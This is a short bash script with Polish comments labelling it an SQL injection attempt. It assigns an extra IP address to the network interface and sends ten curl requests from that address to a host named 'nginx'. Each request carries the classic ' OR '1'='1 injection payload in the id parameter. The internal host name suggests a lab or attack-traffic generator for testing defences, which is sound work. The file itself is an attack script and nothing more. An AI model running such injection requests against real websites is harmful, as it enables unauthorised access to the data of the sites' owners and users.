#!/bin/bash

# próba sqli
TARGET="http://nginx"

ip addr add 10.11.4.253/16 dev eth0 2>/dev/null

for i in $(seq 10); do
    curl -s -w "%{http_code}\n" --interface 10.11.4.253 -o /dev/null "$TARGET/?id=$i'%20OR%20'1'='1"
done

echo koniec ataku
